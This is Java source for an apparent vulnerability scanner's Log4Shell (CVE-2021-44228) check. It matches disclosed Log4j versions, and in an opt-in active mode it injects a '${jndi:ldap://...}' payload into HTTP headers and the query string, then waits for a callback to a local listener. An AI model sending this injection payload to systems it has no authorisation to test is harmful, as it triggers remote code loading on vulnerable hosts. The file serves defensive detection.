package com.himanshu.vulnscan.check.builtin;

import com.himanshu.vulnscan.check.VulnerabilityCheck;
import com.himanshu.vulnscan.check.net.HttpProbe;
import com.himanshu.vulnscan.model.Finding;
import com.himanshu.vulnscan.model.ServiceFingerprint;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Two-tier Log4Shell detection:
 *
 * <ul>
 *   <li>Passive: looks for a disclosed Log4j 2.x version (2.0-2.14.x) or
 *       Log4j/JndiLookup class names in headers and body.</li>
 *   <li>Active (opt-in, {@code --active}): injects a JNDI payload carrying a
 *       loopback-reachable callback address into headers and the query string,
 *       then waits for the target to connect back. A callback is proof that
 *       the payload was evaluated.</li>
 * </ul>
 *
 * <p>The callback listener only accepts and closes connections; it never
 * serves an LDAP response or a malicious class.</p>
 */
public final class Log4ShellCheck implements VulnerabilityCheck {

    private static final int TIMEOUT_MS = 3000;
    private static final long CALLBACK_WAIT_MS = 4000;

    private static final Pattern VERSION = Pattern.compile(
            "(?i)log4j(?:-core|_core)?[/\\s_-]*v?2\\.(\\d{1,2})(?:\\.(\\d{1,2}))?");

    private static final Pattern INDICATOR = Pattern.compile(
            "(?i)(jndilookup|org\\.apache\\.logging\\.log4j)");

    private final boolean active;

    public Log4ShellCheck(boolean active) {
        this.active = active;
    }

    @Override
    public CheckMetadata metadata() {
        return CheckMetadata.builder()
                .id("CVE-2021-44228")
                .name("Log4Shell RCE")
                .description("Apache Log4j2 JNDI injection leading to remote code execution")
                .severity(Severity.CRITICAL)
                .cvss(10.0)
                .affectedProducts(List.of("Apache Log4j 2.0-beta9 through 2.14.1"))
                .references(List.of("https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"))
                .tags(List.of("rce", "log4j", "web", "critical"))
                .build();
    }

    @Override
    public Optional<Finding> execute(ServiceFingerprint fp) {
        if (!"http".equals(fp.getProtocol()) || fp.getTarget() == null || fp.getTarget().isBlank()) {
            return Optional.empty();
        }

        if (active) {
            Optional<Finding> confirmed = probeCallback(fp);
            if (confirmed.isPresent()) {
                return confirmed;
            }
        }
        return passiveIndicator(fp);
    }

    private Optional<Finding> passiveIndicator(ServiceFingerprint fp) {
        return HttpProbe.fetch(fp.getTarget(), fp.getPort(), "/", TIMEOUT_MS)
                .flatMap(response -> {
                    StringBuilder evidence = new StringBuilder();
                    response.headers().forEach((name, values) ->
                            evidence.append(name).append(": ").append(String.join(", ", values)).append('\n'));
                    evidence.append(response.body());

                    String text = evidence.toString();
                    Optional<String> version = vulnerableVersion(text);
                    if (version.isPresent()) {
                        return Optional.of(Finding.fromCheck(
                                metadata(),
                                "Log4j " + version.get() + " disclosed by the endpoint",
                                "The response discloses a Log4j 2.x version in the CVE-2021-44228"
                                        + " affected range. Confirm the resolved dependency version"
                                        + " and upgrade to 2.17.1 or newer."));
                    }

                    Matcher indicator = INDICATOR.matcher(text);
                    if (indicator.find()) {
                        return Optional.of(Finding.fromCheck(
                                metadata(),
                                "Log4j component exposed: " + indicator.group(1),
                                "Log4j classes or JndiLookup references leaked in the response."
                                        + " Confirm the dependency version (affected: 2.0-beta9"
                                        + " through 2.14.1) and upgrade to 2.17.1 or newer."));
                    }
                    return Optional.empty();
                });
    }

    /**
     * Returns the disclosed Log4j version when it falls in the vulnerable
     * 2.0-2.14.x range. Log4j 1.x is not affected by CVE-2021-44228.
     */
    static Optional<String> vulnerableVersion(String text) {
        if (text == null || text.isEmpty()) {
            return Optional.empty();
        }
        Matcher matcher = VERSION.matcher(text);
        while (matcher.find()) {
            int minor = Integer.parseInt(matcher.group(1));
            if (minor < 15) {
                return Optional.of("2." + matcher.group(1)
                        + (matcher.group(2) != null ? "." + matcher.group(2) : ""));
            }
        }
        return Optional.empty();
    }

    private Optional<Finding> probeCallback(ServiceFingerprint fp) {
        String callbackHost = localAddressFor(fp.getTarget(), fp.getPort());
        if (callbackHost == null) {
            return Optional.empty();
        }

        try (ServerSocket listener = new ServerSocket(0, 16)) {
            listener.setSoTimeout(250);
            String host = callbackHost.contains(":") ? "[" + callbackHost + "]" : callbackHost;
            String payload = "${jndi:ldap://" + host + ":" + listener.getLocalPort() + "/vulnscan}";

            Map<String, String> headers = new LinkedHashMap<>();
            headers.put("User-Agent", payload);
            headers.put("X-Api-Version", payload);
            headers.put("Referer", "http://" + fp.getTarget() + "/" + payload);
            headers.put("Cookie", "session=" + payload);

            String path = "/?vulnscan=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);
            HttpProbe.fetch(fp.getTarget(), fp.getPort(), path, headers, TIMEOUT_MS);

            long deadline = System.currentTimeMillis() + CALLBACK_WAIT_MS;
            while (System.currentTimeMillis() < deadline) {
                try (Socket callback = listener.accept()) {
                    return Optional.of(Finding.fromCheck(
                            metadata(),
                            "JNDI callback received from " + callback.getRemoteSocketAddress()
                                    + " after injecting " + payload,
                            "The endpoint evaluated a JNDI lookup supplied in an HTTP header"
                                    + " or query parameter. This confirms CVE-2021-44228 and"
                                    + " should be treated as remote code execution: isolate the"
                                    + " host, upgrade Log4j to 2.17.1 or newer, and rotate secrets"
                                    + " reachable from the application."));
                } catch (SocketTimeoutException ignored) {
                    // Keep waiting until the deadline.
                }
            }
            return Optional.empty();
        } catch (IOException | RuntimeException e) {
            return Optional.empty();
        }
    }

    private static String localAddressFor(String target, int port) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(target, port), 1000);
            InetAddress local = socket.getLocalAddress();
            return local != null ? local.getHostAddress() : null;
        } catch (IOException e) {
            return null;
        }
    }
}
